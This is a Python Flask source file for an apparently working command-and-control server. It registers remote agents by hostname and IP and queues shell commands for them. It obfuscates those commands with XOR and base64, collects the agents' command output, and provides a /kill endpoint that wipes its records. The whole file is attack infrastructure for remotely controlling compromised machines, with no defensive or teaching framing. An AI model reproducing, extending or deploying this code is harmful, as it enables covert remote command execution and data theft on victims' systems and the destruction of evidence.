from flask import Flask, request, jsonify
from flask_cors import CORS
import datetime
import json
import os
import base64

def xor_encrypt(text, key=0x42):
    encrypted = bytes([ord(c) ^ key for c in text])
    return base64.b64encode(encrypted).decode()

def xor_decrypt(b64, key=0x42):
    encrypted = base64.b64decode(b64.encode())
    return ''.join(chr(b ^ key) for b in encrypted)

def save_data():
    with open("c2_data.json", "w") as f:
        json.dump({
            "agents": agents,
            "results": results,
            "tasks": tasks
        }, f, indent=4)

def load_data():
    global agents, results, tasks
    try:
        with open("c2_data.json", "r") as f:
            loaded = json.load(f)
            agents = loaded.get("agents", {})
            results = loaded.get("results", {})
            tasks = loaded.get("tasks", {})
    except (FileNotFoundError, json.JSONDecodeError):
        pass

agents = {}
results = {}
tasks = {}

app = Flask(__name__)
CORS(app)

def registred_agents(agent_id, hostname, ip, last_seen):
    if agent_id not in agents:
        agents[agent_id] = {
            "hostname": hostname,
            "ip": ip,
            "first_seen": last_seen,
            "last_seen": last_seen
        }
    else:
        agents[agent_id]["hostname"] = hostname
        agents[agent_id]["ip"] = ip
        agents[agent_id]["last_seen"] = last_seen
    save_data()

@app.route("/")
def home():
    return "Flask is running."

@app.route("/checkin", methods=["POST"])
def post_data():
    data = request.get_json()

    agent_id = data.get("id")
    hostname = data.get("hostname")
    agent_ip = request.remote_addr
    current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if agent_id is None:
        return jsonify({"error": "Missing 'id' in request body"}), 400

    if hostname is None:
        return jsonify({"error": "Missing 'hostname' in request body"}), 400

    registred_agents(agent_id, hostname, agent_ip, current_datetime)

    return jsonify({
        "success": "id extracted succesfully",
        "extracted_id": agent_id,
        "hostname": hostname
    }), 201

@app.route("/list")
def agents_list():
    return jsonify(agents)

@app.route("/task/<agent_id>", methods=["POST"])
def set_task(agent_id):
    data = request.get_json()
    command = data.get("command")

    if command is None:
        return jsonify({"error": "Missing 'command' in request body"}), 400

    tasks[agent_id] = command
    save_data()
    return jsonify({"status": "tasked", "agent_id": agent_id, "command": command}), 201

@app.route("/task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    if agent_id not in agents:
        return jsonify({"error": "Agent not found"}), 404

    if agent_id in tasks:
        command = tasks.pop(agent_id)
        save_data()
        encrypted_command = xor_encrypt(command)
        return jsonify({"task": encrypted_command})
    else:
        return jsonify({"task": "no_task"})

@app.route("/result", methods=["POST"])
def show_result():
    data = request.get_json()

    agent_id = data.get("id")
    task = data.get("task")

    stdout = xor_decrypt(data.get("stdout"))
    stderr = xor_decrypt(data.get("stderr"))

    if agent_id not in results:
        results[agent_id] = []

    results[agent_id].append({
        "task": task,
        "stdout": stdout,
        "stderr": stderr
    })
    save_data()

    return jsonify({"status": "received"}), 201

@app.route("/result/<agent_id>")
def get_result(agent_id):
    if agent_id not in agents:
        return jsonify({"error": "Agent not found"}), 404

    elif agent_id not in results:
        return jsonify({"message": "No results yet for this agent"}), 200

    else:
        return jsonify(results[agent_id])

@app.route("/kill", methods=["POST"])
def kill_switch():
    agents.clear()
    results.clear()
    tasks.clear()

    try:
        os.remove("c2_data.json")
    except FileNotFoundError:
        pass

    return jsonify({"status": "killed"}), 200

load_data()

if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True, port=4000, threaded=True, ssl_context=("cert.pem", "key.pem"))
